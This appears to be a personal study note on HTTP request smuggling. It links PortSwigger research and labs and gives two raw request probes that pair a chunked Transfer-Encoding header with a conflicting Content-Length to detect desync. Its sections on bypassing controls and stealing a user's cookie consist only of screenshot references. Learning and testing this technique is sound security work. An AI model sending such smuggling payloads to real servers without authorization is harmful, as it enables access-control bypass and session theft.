# http-request-smuggling
## Links
Portswigger: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
OnlineLab: https://portswigger.net/web-security/request-smuggling

![[Pasted image 20210404103936.png]]
![[Pasted image 20210404104014.png]]
![[Pasted image 20210404105914.png]]

## Detecting desync

```html
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

3
abc
Q
```

```html
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

3

X
```

## Confirm
![[Pasted image 20210404105726.png]]

## Bypassing 
![[Pasted image 20210404123048.png]]
![[Pasted image 20210404123146.png]]

## Get a random User
![[Pasted image 20210404123952.png]]

## Get a Cookie 
![[Pasted image 20210404124613.png]]